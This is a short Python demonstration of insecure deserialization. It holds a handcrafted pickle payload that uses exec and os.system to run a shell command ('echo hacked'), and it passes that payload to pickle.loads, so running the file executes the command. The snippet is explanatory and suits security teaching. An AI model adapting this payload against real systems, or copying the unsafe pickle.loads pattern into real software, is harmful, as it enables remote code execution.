# Insecure: deserializing untrusted pickle data leads to RCE
import pickle, base64

# Example malicious pickle payload (for demo only; do not run untrusted data)
malicious_payload = b"c__builtin__\nexec\n(S'import os; os.system(\"echo hacked\")'\ntR."
encoded_payload = base64.b64encode(malicious_payload)

decoded_data = base64.b64decode(encoded_payload)
# The following loads can execute code embedded in the pickle
pickle.loads(decoded_data)
